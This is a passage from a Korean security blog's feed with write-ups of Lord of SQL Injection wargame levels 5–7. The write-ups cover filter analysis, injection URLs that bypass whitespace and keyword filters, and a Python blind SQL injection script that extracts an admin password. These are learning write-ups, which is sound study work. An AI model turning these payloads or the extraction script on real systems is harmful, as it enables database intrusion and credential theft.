class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/or|and/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>pw</code>를 받고, <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <code>pw</code>에 대소문자 구분 없이 <code>or</code>, <code>and</code> 가 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_orge where id='guest' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">$query = <span class="string">"select pw from prob_orge where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"orge"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>pw</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li><code>$result[&#39;id&#39;]</code>에 참이 되는 어떤 값이든 들어 있으면 응답에 <code>&quot;Hello &quot;</code>와 <code>$result[id]</code> 값을 붙인 문자열이 포함된다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>pw</code>와 GET 방식으로 전달받은 <code>pw</code>가 같음’이다. 즉, 실제 데이터베이스에 저장된 <code>pw</code>를 알아내서 전달해야 한다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p>SUBSTR 함수 활용</p><p>Blind SQL Injection 문제이므로 4번 orc 문제에서 이용한 코드를 수정하여 활용한다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">key = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4번 orc 문제에서 이용한 코드에서 추가된 부분</span></span><br><span class="line">pwlen = <span class="number">0</span> <span class="comment"># pw의 길이값을 저장한 변수</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">20</span>): <span class="comment"># pw의 길이를 알아내기 위한 반복문. 길이가 1보다 크거나 같고 20보다 작다는 전제 하에 작동한다. 만약 길이를 알아내는 데 실패하면 범위를 넓힌다.</span></span><br><span class="line">    url = <span class="string">"http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw="</span></span><br><span class="line">    data = <span class="string">"' || id='admin' &amp;&amp; length(pw)='&#123;&#125;'#"</span>.format(str(i)) <span class="comment"># length() 함수를 통해 pw의 길이를 알아내는 부분이다.</span></span><br><span class="line">    print(data)</span><br><span class="line">    data = quote(data)</span><br><span class="line">    re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=jaqm7mrah73p9vvsj7mlp8ec23"</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">        pwlen = i <span class="comment"># pw의 길이를 pwlen 변수에 저장한다.</span></span><br><span class="line">        print(<span class="string">'pw length : '</span> + str(pwlen))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># /4번 orc 문제에서 이용한 코드에서 추가된 부분</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, pwlen + <span class="number">1</span>): <span class="comment"># i에는 1부터 pwlen까지 들어가도록 반복문을 구성</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        url = <span class="string">"http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw="</span></span><br><span class="line">        data = <span class="string">"' || id='admin' &amp;&amp; substr(pw, 1, &#123;&#125;)='&#123;&#125;'#"</span>.format( <span class="comment"># or, and 를 ||, &amp;&amp; 로 수정</span></span><br><span class="line">            str(i), key + chr(j))</span><br><span class="line">        print(data)</span><br><span class="line">        data = quote(data)</span><br><span class="line">        re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=jaqm7mrah73p9vvsj7mlp8ec23"</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">            key += chr(j).lower()</span><br><span class="line">            print(key)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure><p>이러한 코드를 실행하면 결과값으로 <code>6c864dec</code>를 출력한다.<br>이를 GET 방식으로 <code>pw</code>의 값으로 전달하면 풀린다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw=6c864dec</span><br></pre></td></tr></table></figure></li><li><p><code>UNION</code> 구문 및 <code>LIMIT</code> 구문 이용</p><p>7번 문제는 <code>UNION</code> 구문을 필터링 하지 않고 있으므로 <code>UNION</code>을 통해 바로 <code>pw</code>값을 알아내는 시도를 해볼 수 있다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw=-1&apos; || @a:=pw %26%26 0 union select @a-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_orge <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> pw=<span class="string">''</span> || @a:=pw &amp;&amp; <span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> @a<span class="comment">-- -'</span></span><br></pre></td></tr></table></figure><p><code>Hello 6c864dec</code></p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 7번 orge 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.6 Darkelf</title>
    <link href="https://www.jslee.me/2019/08/17/los-write-up-06-darkelf/"/>
    <id>https://www.jslee.me/2019/08/17/los-write-up-06-darkelf/</id>
    <published>2019-08-17T13:42:40.000Z</published>
    <updated>2019-08-20T11:08:10.062Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 6번 darkelf 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p><code>or</code>, <code>and</code>를 사용하지 않고 원하는 문자열을 <code>SELECT</code> 하도록 SQL을 조작할 수 있는지 확인한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>darkelf 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/or|and/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_darkelf where id='guest' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"darkelf"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/or|and/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>pw</code>를 받고, <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <code>pw</code>에 대소문자 구분 없이 <code>or</code>, <code>and</code> 가 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_darkelf where id='guest' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"darkelf"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>pw</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>id</code>에 <code>&quot;admin&quot;</code>이라는 값이 들어있음’이다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p><code>||</code>, <code>&amp;&amp;</code> 이용</p><p>논리 연산을 막기 위해 <code>OR</code>, <code>AND</code>를 필터링 한 문제이다.</p><p>그러나 논리 연산은 위 두 연산자 뿐만 아니라 <code>||</code>, <code>&amp;&amp;</code> 연산자도 존재한다.</p><p><code>OR</code>은 <code>||</code>로 완전히 대체 가능하고, <code>AND</code>는 <code>&amp;&amp;</code>로 완전히 대체 가능하다.</p><p>이때, URL에 직접 SQL Injection을 수행하는 경우 <code>&amp;</code> 문자는 그대로 삽입하면 작동하지 않으므로 URL Encoding을 거친 <code>%26</code> 으로 삽입하여야 한다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/darkelf_6e50323a0bfccc2f3daf4df731651f75.php?pw=&apos; || id=&apos;admin&apos;-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_darkelf <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> pw=<span class="string">''</span> || <span class="keyword">id</span>=<span class="string">'admin'</span><span class="comment">-- -'</span></span><br></pre></td></tr></table></figure><p>이는 <code>$result[&#39;id&#39;]</code>에 <code>&#39;admin&#39;</code>이 들어가도록 하므로 문제가 풀린다.</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 6번 darkelf 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.5 Wolfman</title>
    <link href="https://www.jslee.me/2019/08/16/los-write-up-05-wolfman/"/>
    <id>https://www.jslee.me/2019/08/16/los-write-up-05-wolfman/</id>
    <published>2019-08-16T05:19:32.000Z</published>
    <updated>2019-08-20T11:08:10.032Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 5번 wolfman 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p>공백문자(‘ ‘)를 사용하지 않고 원하는 문자열을 <code>SELECT</code> 하도록 SQL을 조작할 수 있는지 확인한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>wolfman 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/ /i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No whitespace ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_wolfman where id='guest' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"wolfman"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/ /i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No whitespace ~_~"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>pw</code>를 받고, <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <code>pw</code>에 <code>공백문자(&#39; &#39;)</code> 가 들어 있으면 <code>No whitespace ~_~</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_wolfman where id='guest' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"wolfman"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>pw</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>id</code>에 <code>&quot;admin&quot;</code>이라는 값이 들어있음’이다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p>CR(Carriage Return) 이용</p><p>ASCII Code 표를 살펴보면 16진수로 <code>0x0D</code>는 <code>Carriage Return</code>에 해당한다.<br>이는 MySQL에서 공백으로 인식하는 문자들 중 하나이다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/wolfman_f14e72f8d97e3cb7b8fe02bef1590757.php?pw=&apos;%0Dor%0Did=&apos;admin&apos;--%0D-</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_wolfman <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> pw=<span class="string">''</span> <span class="keyword">or</span> <span class="keyword">id</span>=<span class="string">'admin'</span><span class="comment">-- -'</span></span><br></pre></td></tr></table></figure><p>이는 <code>$result[&#39;id&#39;]</code>에 <code>&#39;admin&#39;</code>이 들어가도록 하므로 문제가 풀린다.</p></li><li><p>LF(Line Feed)</p><p>ASCII Code 표를 살펴보면 16진수로 <code>0x0A</code>는 <code>Line Feed</code>에 해당한다.<br>이는 MySQL에서 공백으로 인식하는 문자들 중 하나이다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/wolfman_f14e72f8d97e3cb7b8fe02bef1590757.php?pw=&apos;%0Aor%0Aid=&apos;admin&apos;%23</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_wolfman <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> pw=<span class="string">''</span> <span class="keyword">or</span> <span class="keyword">id</span>=<span class="string">'admin'</span><span class="comment">#'</span></span><br></pre></td></tr></table></figure><p>주석으로 <code>#</code>을 쓴 이유는 <code>-- -</code>을 사용할 때 가운데 공백으로 %0A를 사용하면 정상적으로 작동하지 않기 때문이다.</p><p>이는 <code>$result[&#39;id&#39;]</code>에 <code>&#39;admin&#39;</code>이 들어가도록 하므로 문제가 풀린다.</p></li><li><p>Tab</p><p>ASCII Code 표를 살펴보면 16진수로 <code>0x09</code>는 <code>Tab</code>에 해당한다.<br>이는 MySQL에서 공백으로 인식하는 문자들 중 하나이다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/wolfman_f14e72f8d97e3cb7b8fe02bef1590757.php?pw=&apos;%09or%09id=&apos;admin&apos;--%09-</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_wolfman <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> pw=<span class="string">''</span><span class="keyword">or</span><span class="keyword">id</span>=<span class="string">'admin'</span><span class="comment">---'</span></span><br></pre></td></tr></table></figure><p>이는 <code>$result[&#39;id&#39;]</code>에 <code>&#39;admin&#39;</code>이 들어가도록 하므로 문제가 풀린다.</p></li><li><p>주석</p><p>MySQL에서 구문 사이에 주석을 넣으면 공백이 없어도 정상적으로 동작한다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/wolfman_f14e72f8d97e3cb7b8fe02bef1590757.php?pw=&apos;/**/or/**/id=&apos;admin&apos;%23</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_wolfman <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'guest'</span> <span class="keyword">and</span> pw=<span class="string">''</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="keyword">id</span>=<span class="string">'admin'</span><span class="comment">#'</span></span><br></pre></td></tr></table></figure><p>주석으로 <code>#</code>을 쓴 이유는 <code>-- -</code>을 사용할 때 가운데 공백으로 주석을 사용하면 정상적으로 작동하지 않기 때문이다.</p><p>이는 <code>$result[&#39;id&#39;]</code>에 <code>&#39;admin&#39;</code>이 들어가도록 하므로 문제가 풀린다.</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 5번 wolfman 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
